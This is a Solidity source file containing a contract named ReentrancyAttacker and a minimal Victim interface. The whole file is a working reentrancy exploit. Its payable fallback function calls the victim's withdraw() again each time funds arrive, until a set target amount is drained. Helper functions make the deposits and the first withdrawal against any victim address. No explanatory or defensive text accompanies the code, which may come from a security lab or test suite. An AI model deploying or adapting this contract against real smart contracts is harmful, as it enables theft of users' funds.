pragma solidity ^0.4.19;

contract ReentrancyAttacker {
  uint256 targetAmount;
  uint256 drainedAmount;

  function setTargetAmount(uint256 amount) {
    targetAmount = amount;
    drainedAmount = 0;
  }

  function isSumBitch() constant returns (bool) {
    return true;
  }

  function getContractBalance() constant returns (uint256) {
    return this.balance;
  }

  function() payable {
    if (drainedAmount < targetAmount) {
      drainedAmount += msg.value;
      Victim _victim = Victim(msg.sender);
      _victim.withdraw();
    }
  }

  function makeDeposit(address victim, uint amount) {
    Victim _victim = Victim(victim);
    _victim.deposit.value(amount)();
  }

  function makeWithdrawal(address victim) {
    Victim _victim = Victim(victim);
    _victim.withdraw();
  }
}

contract Victim {
  function deposit() payable;
  function withdraw();
}